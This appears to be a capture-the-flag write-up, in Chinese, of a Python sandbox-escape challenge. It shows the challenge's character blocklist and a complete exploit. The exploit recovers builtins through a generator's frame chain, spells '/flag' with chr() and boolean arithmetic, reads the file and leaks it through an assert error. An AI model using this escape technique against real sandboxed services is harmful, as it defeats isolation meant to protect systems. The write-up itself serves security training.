# I really really really ultimate

## 题目简述

本题是更严格的 Python 沙箱。基础黑名单仍然包含 `__`、引号、方括号、数字、`def`、`class`、`lambda`、`builtins` 等内容，并且这次 Unicode 绕过也被封掉。但题目没有禁用括号和生成器，因此可以走栈帧逃逸。

关键利用点是生成器对象的 `gi_frame.f_back`。通过构造并激活生成器，可以回溯到调用栈帧，拿到 `f_globals`，再从全局变量中找回 `builtins`。之后用 `True` 算术构造数字，调用 `builtins.chr()` 拼出 `/flag`，读取文件并用 `assert` 的报错信息泄露内容。

## 解题过程

禁用了

```
['__', '"', "'", '\\', '[', ']', ';', '{', '}',
 '1', '2', '3','4', '5', '6', '7', '8', '9', '0',
 'def', 'class', 'lambda','builtins']
```

除此之外,unicode彻底进了黑名单
但是注意到并没有禁止(),想到就可以造生成器来栈帧逃逸。
g = (g.gi_frame.f_back for _ in (None,))
激活生成器
f = g.send(None)
继续定义回溯规则
fr = f.f_back
gl = fr.f_globals
定义完成，开始循环以获得某一帧所有的特定对象builtins
并且因为ban了数字，可以用True隐式=1来造数字

```
it = gl
idx = False
k = None
one = True
two = one + one
four = two * two
six = four + two
for v in it:
    k = v
    if idx == six:
        bn = gl.get(k)
    idx = idx + True
```

这里在下标为7的位置发现了builtins，然后利用其open函数去打开flag,因为没法使用"'"，所以我们只能拼出/flag的
变量，在builtins中存在chr函数，然后利用之前所述的规则造数，最后拼出/flag。然后利用assert报错泄露出结
果。以下是完整exp

```
g=(g.gi_frame.f_back
for _ in (None,))
f=g.send(None)
fr=f.f_back
gl=fr.f_globals
it=gl
idx=False
k=None
one=True
two=one+one
four=two*two
six=four+two
for v in it:
    k=v
    if idx==six:
        bn=gl.get(k)
    idx=idx+True
eight=two*four
sixteen=four*four
thirtytwo=two*sixteen
sixtyfour=four*sixteen
na=thirtytwo+eight
na=na+four
na=na+two
na=na+one
nb=sixtyfour+thirtytwo
nb=nb+four
nb=nb+two
nc=sixtyfour+thirtytwo
nc=nc+eight
nc=nc+four
nd=sixtyfour+thirtytwo
nd=nd+one
ne=sixtyfour+thirtytwo
ne=ne+four
ne=ne+two
ne=ne+one
ca=bn.chr(na)
cb=bn.chr(nb)
cc=bn.chr(nc)
cd=bn.chr(nd)
ce=bn.chr(ne)
pa=ca+cb
pa=pa+cc
pa=pa+cd
pa=pa+ce
h=bn.open(pa)
d=h.read()
assert False,d
```

## 方法总结

当 pyjail 封掉 Unicode 同形替换后，要重新审计语言特性本身是否还暴露帧对象。生成器、异常对象、traceback、闭包和函数属性都可能提供 frame/globals/builtins 访问路径。本题的复用信号是：`()` 可用、生成器可创建、没有完全阻断 `gi_frame`，因此可以从栈帧恢复 `builtins`，再用 `chr` 和布尔算术绕过字符串与数字限制。
